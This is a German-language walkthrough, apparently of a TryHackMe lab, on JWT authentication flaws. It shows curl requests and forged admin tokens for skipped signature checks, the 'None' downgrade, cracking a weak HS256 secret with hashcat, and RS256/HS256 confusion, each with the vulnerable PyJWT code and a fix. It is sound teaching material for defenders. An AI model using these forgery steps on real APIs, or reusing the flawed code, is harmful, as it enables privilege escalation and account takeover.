# Token based Authentifizierung

## APIs 
Application Programming Interfaces, kurz APIs, sind heute unglaublich beliebt. Einer der Hauptgründe für diesen Boom ist die Möglichkeit, eine einzige API zu erstellen, die dann mehrere verschiedene Schnittstellen, wie z. B. eine Webanwendung und eine mobile Anwendung, gleichzeitig bedienen kann. Dadurch kann die gleiche serverseitige Logik zentralisiert und für alle Schnittstellen wiederverwendet werden. Aus Sicherheitsperspektive ist dies in der Regel auch von Vorteil, da wir so die serverseitige Sicherheit in einer einzigen API implementieren können, die dann unseren Server unabhängig von der verwendeten Schnittstelle schützt.

Mit dem Aufkommen von APIs wurden jedoch auch neue Methoden zur Session-Verwaltung entwickelt. Da Cookies in der Regel mit Webanwendungen verbunden sind, die über einen Browser genutzt werden, funktioniert die Cookie-basierte Authentifizierung für APIs in der Regel nicht so gut, da die Lösung dann nicht für andere Schnittstellen geeignet ist. Hier kommt die tokenbasierte Session-Verwaltung ins Spiel.

## Token Basiertes Session Management
Die tokenbasierte Sitzungsverwaltung ist ein relativ neues Konzept. Anstelle der automatischen Cookie-Verwaltungsfunktionen des Browsers wird hierfür clientseitiger Code verwendet. Nach der Authentifizierung stellt die Webanwendung ein Token im Request-Body bereit. Mithilfe von clientseitigem JavaScript-Code wird dieses Token dann im LocalStorage des Browsers gespeichert.

Bei einer neuen Anfrage muss der JavaScript-Code das Token aus dem Speicher laden und als Header anhängen. Eine der gängigsten Arten von Tokens sind JSON Web Tokens (JWT), die über den Header „`Authorization: Bearer`“ übergeben werden. Da wir jedoch nicht die integrierten Cookie-Verwaltungsfunktionen des Browsers verwenden, herrscht hier ein wenig Wildwest-Stimmung, in der alles möglich ist. Es gibt zwar Standards, aber nichts zwingt dazu, sich an diese Standards zu halten. Tokens wie JWTs sind eine Möglichkeit, die tokenbasierte Session-Verwaltung zu standardisieren.

## Kommunikation mit der API

Nachfolgend finden sich die zwei mögliche Curl-Anfragen, die man für die Schnittstelle mit der API verwenden kann. Für die Authentifizierung kann die folgende Curl-Anfrage gestellt werden:

```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "passwordX" }' http://10.10.82.44/api/v1.0/exampleX
```

Zur Benutzerüberprüfung kann die folgende Curl-Anfrage gestellt werden:

```
curl -H 'Authorization: Bearer [JWT token]' http://10.10.82.44/api/v1.0/example2?username=Y
```

Die Komponente [JWT-Token] muss durch den JWT ersetzt werden, der bei der ersten Anfrage empfangen wurde. In diesem Fall kann Y je nach Ihren Berechtigungen entweder „user” oder „admin” sein.

# JWTs 

## JWT Struktur

Ein JWT besteht aus drei Komponenten, die jeweils Base64Url-kodiert und durch Punkte getrennt sind:

**Header** – Der Header gibt in der Regel den Typ des Tokens an, in diesem Fall JWT, sowie den verwendeten Signaturalgorithmus.

**Payload** – Die Payload ist der Hauptteil des Tokens, der die Claims enthält. Ein Claim ist eine Information, die für eine bestimmte Entität bereitgestellt wird. In JWTs gibt es registrierte Ansprüche, die durch den JWT-Standard vordefiniert sind, sowie öffentliche oder private Ansprüche. Die öffentlichen und privaten Ansprüche werden vom Entwickler definiert. Es ist wichtig, den Unterschied zwischen öffentlichen und privaten Ansprüchen zu kennen, jedoch nicht aus Sicherheitsgründen.

**Signatur** – Die Signatur ist der Teil des Tokens, der eine Methode zur Überprüfung der Authentizität des Tokens bereitstellt. Die Signatur wird unter Verwendung des im Header des JWT angegebenen Algorithmus erstellt.

## Signing Algorithms

Obwohl im JWT-Standard mehrere verschiedene Algorithmen definiert sind, interessieren uns eigentlich nur drei Hauptalgorithmen:

**None** – Der None-Algorithmus bedeutet, dass für die Signatur kein Algorithmus verwendet wird. Tatsächlich handelt es sich hierbei um ein JWT ohne Signatur, was bedeutet, dass die im JWT enthaltenen Angaben nicht anhand der Signatur überprüft werden können.
**Symmetrische Signatur** – Ein symmetrischer Signaturalgorithmus wie HS256 erstellt die Signatur, indem er einen geheimen Wert an den Header und den Body des JWT anhängt, bevor er einen Hashwert generiert. Die Überprüfung der Signatur kann von jedem System durchgeführt werden, das den geheimen Schlüssel kennt.
**Asymmetrische Signatur** – Ein asymmetrischer Signaturalgorithmus wie RS256 erstellt die Signatur, indem er einen privaten Schlüssel verwendet, um den Header und den Body des JWT zu signieren. Diese wird erstellt, indem der Hash generiert und dann mit dem privaten Schlüssel verschlüsselt wird. Die Überprüfung der Signatur kann von jedem System durchgeführt werden, das den öffentlichen Schlüssel kennt, der mit dem privaten Schlüssel verknüpft ist, der zur Erstellung der Signatur verwendet wurde.

## Sicherheit in der Signatur

JWTs können verschlüsselt werden (sogenannte JWEs), aber die eigentliche Stärke von JWTs liegt in der Signatur. Sobald ein JWT signiert ist, kann er an den Client gesendet werden, der diesen JWT bei Bedarf verwenden kann. Wir können einen zentralen Authentifizierungsserver einrichten, der die JWTs erstellt, die in mehreren Anwendungen verwendet werden. Jede Anwendung kann dann die Signatur des JWT überprüfen. Wenn die Signatur bestätigt wird, können die im JWT enthaltenen Angaben als vertrauenswürdig angesehen und entsprechend verarbeitet werden.

# Sensetive Information Disclosure

Das erste häufige Problem, mit dem wir uns befassen werden, ist die Offenlegung sensibler Informationen innerhalb des JWT. Bei Tokens werden die Ansprüche jedoch offengelegt, da das gesamte JWT clientseitig gesendet wird. Wenn dieselbe Entwicklungspraxis befolgt wird, können sensible Informationen offengelegt werden. Einige Beispiele sind in realen Anwendungen zu sehen:
- Offenlegung von Anmeldedaten mit dem Passwort-Hash oder, noch schlimmer, dem Klartext-Passwort, das als Anspruch gesendet wird.
- Offenlegung interner Netzwerkinformationen wie der privaten IP-Adresse oder des Hostnamens des Authentifizierungsservers.

## Praktisches Beispiel

Sehen wir uns ein praktisches Beispiel an. Authentifizieren wir uns mit der folgenden cURL-Anfrage bei unserer API:

`curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.82.44/api/v1.0/example1`

Dadurch erhalten Sie ein JWT-Token. Entschlüsseln Sie nach der Wiederherstellung den Textkörper des JWT, um sensible Informationen aufzudecken. Sie können den Textkörper manuell entschlüsseln oder hierfür eine Website wie `JWT.io` verwenden oder noch besser https://jwt.tplant.com.au/
### Was ist hier der Fehler
In diesem Beispiel wurden sensible Informationen zum Anspruch hinzugefügt, wie unten dargestellt:

```
payload = { 
"username" : username, 
"password" : password, 
"admin" : 0, 
"flag" : "[redacted]" 
} 
access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

### Der Fix 
Werte wie das Passwort oder die Flagge sollten nicht als Ansprüche hinzugefügt werden, da das JWT auf der Clientseite gesendet wird. Stattdessen sollten diese Werte sicher auf der Serverseite im Backend gespeichert werden. Bei Bedarf kann der Benutzername aus einem verifizierten JWT gelesen und zum Nachschlagen dieser Werte verwendet werden, wie im folgenden Beispiel gezeigt:

```
payload = jwt.decode(token, self.secret, algorithms="HS256") 

username = payload['username'] 
flag = self.db_lookup(username, "flag")
```

# Signature Validation Mistakes

Der zweite häufige Fehler bei JWTs ist die nicht korrekte Überprüfung der Signatur. Wenn die Signatur nicht korrekt überprüft wird, kann ein Angreifer möglicherweise einen gültigen JWT-Token fälschen, um Zugriff auf das Konto eines anderen Benutzers zu erhalten. Sehen wir uns die häufigsten Probleme bei der Signaturüberprüfung einmal genauer an.

## Not Verifying the Signature

Das erste Problem bei der Signaturvalidierung tritt auf, wenn keine Signaturvalidierung stattfindet. Wenn der Server die Signatur des JWT nicht überprüft, ist es möglich, die Claims im JWT nach Belieben zu ändern. Es ist zwar ungewöhnlich, dass APIs keine Signaturvalidierung durchführen, aber es kann vorkommen, dass die Signaturvalidierung bei einem einzelnen Endpunkt innerhalb der API ausgelassen wurde. Je nach Sensibilität des Endpunkts kann dies erhebliche geschäftliche Auswirkungen haben.

### Beispiel 
Gegebenheit API via http://10.10.187.114/api/v1.0/example2

Zuerst Authentifizieren wir uns einmal als Normaler user via:
```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.187.114/api/v1.0/example2
```

Nachdem dass passiert ist können wir einmal unseren User verifizieren via 

```
curl -H 'Authorization: Bearer [JWT Token]' http://10.10.187.114/api/v1.0/example2?username=user
```

Nach der Authentifizierung des Normalen Users bekommen wir als Antwort den JWT wie hier zum Beispiel: 

`"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"`

Versuchen wir jedoch, unseren Benutzer ohne die Signatur zu verifizieren, entfernen wir den dritten Teil des JWT (und lassen nur den Punkt stehen) und stellen wir die Anfrage erneut. Werden wir sehen, dass die Verifizierung weiterhin funktioniert! Das bedeutet, dass die Signatur nicht überprüft wird.

Um den Token zu Modifizieren können wir uns den jetzt einmal via https://jwt.tplant.com.au/ decoden lassen und sehen das die Decoded Payload wie Folgt ist: 

```
{

  "username": "user",

  "admin": 0

}
```

Anhand dessen können wir jetzt versuchen in der Payload den wert bei admin von 0 auf 1 zu setzen und uns dann den Token wieder encoden lassen. Sollte so aussehen: 

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.9SCUBKr8YVDh0y5dClP7JZsjWpHPOojJ3ywGvhqU3v8` 

Da wir uns nun als Admin verifizieren lassen wollen müssen wir zudem noch die Anfrage anpassen, das '=user' am ende wird zu '=admin' um den admin user zu wählen. Die Fertige anfrage mit Modifizierten JWT und User sieht dann wie Folgt aus: 

```
curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.9SCUBKr8YVDh0y5dClP7JZsjWpHPOojJ3ywGvhqU3v8"]' http://10.10.187.114/api/v1.0/example2?username=admin
```

Und schon erkennt uns die API als Admin an.

### Der Fehler von Developer Seite

Im Beispiel wird die Signatur nicht überprüft, wie unten gezeigt:
```
payload = jwt.decode(token, options={'verify_signature': False})
```

Während dies bei normalen APIs selten vorkommt, ist es bei Server-zu-Server-APIs häufig der Fall. In Fällen, in denen ein Angreifer direkten Zugriff auf den Backend-Server hat, können JWTs gefälscht werden.

### Wie Das Problem gefixed wird

Der JWT sollte immer überprüft werden, oder es sollten zusätzliche Authentifizierungsfaktoren wie Zertifikate für die Server-zu-Server-Kommunikation verwendet werden. Der JWT kann durch Angabe des Geheimnisses (oder öffentlichen Schlüssels) überprüft werden, wie im folgenden Beispiel gezeigt:

```
payload = jwt.decode(token, self.secret, algorithms="HS256")
```

## Downgrading to None

Ein weiteres häufiges Problem ist die Herabstufung des Signaturalgorithmus. JWTs unterstützen den Signaturalgorithmus „None“, was effektiv bedeutet, dass keine Signatur mit dem JWT verwendet wird. Das mag zwar albern klingen, aber die Idee dahinter war im Standard für die Server-zu-Server-Kommunikation, bei der die Signatur des JWT in einem vorgelagerten Prozess überprüft wurde. Daher müsste der zweite Server die Signatur nicht überprüfen. Angenommen jedoch, die Entwickler legen den Signaturalgorithmus nicht fest oder lehnen zumindest den Algorithmus „None“ ab. In diesem Fall kann der JWT als „None“ angegebene Algorithmus einfach geändert werden, wodurch die für die Signaturüberprüfung verwendete Bibliothek immer „true“ zurückgibt und man somit wieder beliebige Ansprüche innerhalb Ihres Tokens fälschen können.

### Praktisches Beispiel: 
Gegebenheit API via http://10.10.187.114/api/v1.0/example3

Zuerst Authentifizieren wir uns einmal als Normaler user via:

```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.10.49.39/api/v1.0/example3
```

und holen uns unseren Token ab: 

`"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"`

Jetzt gehen wir her und wandeln die Ersten beiden Segmente des JWTs zu Text um via Cyberchef und dem "From Base64" rezept. Nur die Ersten beiden  da die die Relevanten Claims haben. Claim nummer 3 ist für die Signatur die wir hier nicht benötigen

Daraus ergibt sich 
- Claim 1 
	- 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'
	- {"typ":"JWT","alg":"HS256"}
- Claim 2
	- eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0
	- {"username":"user","admin":0}

Da wir bei dem Beispiel dafür sorgen wollen das der Signatur algorythmus auf 'None' Gesetzt wird müssen wir erstmal einen JWT mit der Passenden Information senden. Hierfür Modifizieren wir Claim 1 und zwar den wert `"alg":"HS256"` zu `"alg":"None"` und wandeln dass dann wieder in Base64 um das ergibt dann 'eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0'.  

Zudem müssen wir hier noch anpassen das wir Admin Rechte erhalten in Claim2 indem wir den Wert `"admin":0` zu `"admin":1` setzen. Das dann in Base 64 umgewandelt ist dann: `eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0`

Jetzt können wir die Erste Anfrage wieder zusammensetzen.

```
curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"]' http://10.10.49.39/api/v1.0/example3?username=admin
```

### Der Fehler im Code

Auch wenn dies wie das gleiche Problem wie zuvor erscheint, ist es aus Entwicklersicht etwas komplexer. Manchmal möchten Entwickler sicherstellen, dass ihre Implementierung mehrere JWT-Signaturprüfungsalgorithmen akzeptiert. Die Implementierung würde dann in der Regel den Header des JWT lesen und den gefundenen Algorithmus in die Signaturprüfungskomponente einlesen, wie unten gezeigt:

```
header = jwt.get_unverified_header(token) 

signature_algorithm = header['alg'] 

payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
```

Wenn der Angreifer jedoch „None“ als Algorithmus angibt, wird die Signaturprüfung umgangen. Pyjwt, die in diesem Raum verwendete JWT-Bibliothek, hat Sicherheitscodierungen implementiert, um dieses Problem zu verhindern. Wenn bei Auswahl des Algorithmus „None“ ein Geheimnis angegeben wird, wird eine Ausnahme ausgelöst.

### Fix 

Wenn mehrere Signaturalgorithmen unterstützt werden sollen, müssen die unterstützten Algorithmen der Dekodierungsfunktion als Array-Liste übergeben werden, wie unten gezeigt:

```
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username'] 
flag = self.db_lookup(username, "flag")
```

## Weak Symmetric Secrets

Wenn ein symmetrischer Signaturalgorithmus verwendet wird, hängt die Sicherheit des JWT von der Stärke und Entropie des verwendeten Geheimnisses ab. Wenn ein schwaches Geheimnis verwendet wird, kann es möglich sein, das Geheimnis durch Offline-Cracking wiederherzustellen. Sobald der geheime Wert bekannt ist, können Sie die Claims in Ihrem JWT erneut ändern und mit dem Geheimnis eine gültige Signatur neu berechnen.

### Praktisches Beispiel 
Gegebenheit API via http://10.10.207.144/api/v1.0/example4
User: user
Passwort: passwort4

zuerst holen wir uns einmal beim Server unseren JWT für den Bekannten Nutzer mit PW. 

```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.10.207.144/api/v1.0/example4
```

Hier erhalten wir einen Token wie Folgt 

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY`

um hier jetzt das Secret herauszubekommen müssen wir den JWT knacken. Hierzu speichern wir den Token in einer text datei ab, als z.B. jwt.txt. Danach laden wir uns die Passende wordlist noch von Github via: 

`wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`

Jetzt haben wir die 2 wichtigen komponenten nun können wir den JWT via John oder Hashcat knacken

```
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```

Hier bekommen wir dann heraus das dass secret "secret" ist. Anhand dessen können wir uns nun einen eigenen JWT mit admin claim bauen via jwt.io, indem wir den "admin" wert von 0 auf 1 setzen und dann beim encoder angeben das der JWT mit secret gesigned werden soll. Das resultat sieht dann ungefähr so aus: 

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc`

Diesen Modifizierten JWT können wir dann wieder übermitteln via

```
curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc"]' http://10.10.207.144/api/v1.0/example4?username=admin
```

Damit haben wir uns dann als Admin authorisiert und bekommen nun unsere THM Flag


### Das Problem 
Das Problem kann auftreten, wenn ein schwaches JWT-Geheimnis verwendet wird. Dies kann häufig vorkommen, wenn Entwickler in Eile sind oder Code aus Beispielen kopieren.

### Der Fix 

Es sollte ein sicherer geheimer Wert ausgewählt werden. Da dieser Wert in der Software und nicht von Menschen verwendet wird, sollte für den geheimen Wert eine lange, zufällige Zeichenfolge verwendet werden.
## Signature Algorithm Confusion

Das letzte häufige Problem bei der Signaturvalidierung tritt auf, wenn ein Algorithmus-Verwirrungsangriff durchgeführt werden kann. Dies ähnelt dem None-Downgrade-Angriff, tritt jedoch speziell bei Verwirrung zwischen symmetrischen und asymmetrischen Signaturalgorithmen auf. Wenn beispielsweise ein asymmetrischer Signaturalgorithmus wie RS256 verwendet wird, kann es möglich sein, den Algorithmus auf HS256 herunterzustufen. In diesen Fällen würden einige Bibliotheken standardmäßig wieder den öffentlichen Schlüssel als Geheimnis für den symmetrischen Signaturalgorithmus verwenden. Da der öffentliche Schlüssel bekannt sein kann, können Sie eine gültige Signatur fälschen, indem Sie den HS256-Algorithmus in Kombination mit dem öffentlichen Schlüssel verwenden.


### Praktisches Beispiel 

Gegebenheit API via http://10.10.207.144/api/v1.0/example5
User: user
Passwort: passwort4


Vorgehen 
Zuerst holen wir uns den Token mit bekannten login daten ab

```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.10.207.144/api/v1.0/example5

Response: 
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",

  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}

```
Jetzt haben wir sowohl den Token als auch den Public Key. Jetzt können wir einmal testen das der Token auch funktioniert via

```
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q' http://10.10.207.144/api/v1.0/example5?username=user
```

Nachdem Funktionalität getestet ist können wir anfangen den Token zu Modifizieren via https://jwt.tplant.com.au/ hier passen wir an: 
- "alg": "RS256" zu "alg": "HS256"
- "admin": 0 zu "admin": 1

Zudem geben wir als Secret den Public Key an und erhalten daraus den Token: 

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU
```

Mit diesem melden wir uns nun am Server via: 

```
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU' http://10.10.207.144/api/v1.0/example5?username=admin
```

und schon haben wir Admin rechte und erhalten die Flag.

### Programmier Fehler

Der Fehler in diesem Beispiel ähnelt dem in Beispiel 3, ist jedoch etwas komplexer. Der None-Algorithmus ist zwar nicht zulässig, das Hauptproblem besteht jedoch darin, dass sowohl symmetrische als auch asymmetrische Signaturalgorithmen zulässig sind, wie im folgenden Beispiel gezeigt wird:

```
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
```

Es ist darauf zu achten, dass Signaturalgorithmen niemals miteinander vermischt werden, da der geheime Parameter der Dekodierungsfunktion sowohl als geheimer als auch als öffentlicher Schlüssel interpretiert werden können.

### Fix

Obwohl beide Arten von Signaturalgorithmen zulässig sind, ist etwas mehr Logik erforderlich, um Verwechslungen zu vermeiden, wie das folgende Beispiel zeigt:

```
header = jwt.get_unverified_header(token) 
algorithm = header['alg'] 
payload = "" 

if "RS" in algorithm: 
	payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"]) 

elif "HS" in algorithm: 
	payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"]) 

username = payload['username'] 
flag = self.db_lookup(username, "flag")
```

# JWT Lifetimes

Vor der Überprüfung der Signatur des Tokens sollte dessen Lebensdauer berechnet werden, um sicherzustellen, dass das Token nicht abgelaufen ist. Dies geschieht in der Regel durch Auslesen des exp-Claims (Ablaufzeit) aus dem Token und Berechnung, ob das Token noch gültig ist.

Ein häufiges Problem ist, dass bei einem zu hohen (oder gar keinem) exp-Wert das Token zu lange gültig bleibt oder sogar nie abläuft. Bei Cookies kann der Cookie serverseitig auf abgelaufen gestellt werden. JWTs verfügen jedoch nicht über diese integrierte Funktion. Wenn wir ein Token vor Ablauf der exp-Zeit ablaufen lassen möchten, müssen wir eine Sperrliste dieser Token führen, wodurch das Modell dezentraler Anwendungen, die denselben Authentifizierungsserver verwenden, durchbrochen wird. Daher sollte bei der Auswahl des richtigen exp-Werts unter Berücksichtigung der Funktionalität der Anwendung Sorgfalt walten gelassen werden. Beispielsweise wird für einen Mailserver wahrscheinlich ein anderer exp-Wert verwendet als für eine Bankanwendung.

Ein weiterer Ansatz ist die Verwendung von Refresher-Tokens. Wenn Sie eine API testen möchten, die JWTs verwendet, empfiehlt es sich, sich mit diesen Tokens auseinanderzusetzen.

### Praktisches Beispiel 

Da die Tokens nicht ablaufen haben wir hier einen 300+ Tage alten Token bekommen mit dem wir uns einfach authentifizieren können wie Folgt: 

```
curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU' http://10.10.27.245/api/v1.0/example6?username=admin
```

### Fehler beim Dev

Wie oben erwähnt, hat der JWT keinen exp-Wert, was bedeutet, dass er dauerhaft gültig ist. Falls kein exp-Claim vorhanden ist, würden die meisten JWT-Bibliotheken das Token als gültig akzeptieren, wenn die Signatur verifiziert ist.

### Fix

Den Claims sollte ein exp-Wert hinzugefügt werden. Nach dem Hinzufügen überprüfen die meisten Bibliotheken bei der Gültigkeitsprüfung auch die Ablaufzeit des JWT. Dies kann wie im folgenden Beispiel gezeigt erfolgen:

```
lifetime = datetime.datetime.now() + datetime.timedelta(minutes=5) 

payload = { 
	'username' : username, 
	'admin' : 0, 
	'exp' : lifetime 
} 

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```
